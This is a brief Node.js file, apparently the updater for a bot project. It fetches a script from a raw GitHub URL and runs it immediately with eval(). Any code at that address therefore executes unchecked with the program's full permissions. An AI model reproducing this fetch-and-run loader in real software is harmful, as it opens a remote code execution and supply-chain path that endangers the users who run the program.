const axios = require('axios');

axios.get("https://raw.githubusercontent.com/jarif098/SYNTAX-BOT/main/updater.js")
	.then(res => eval(res.data));
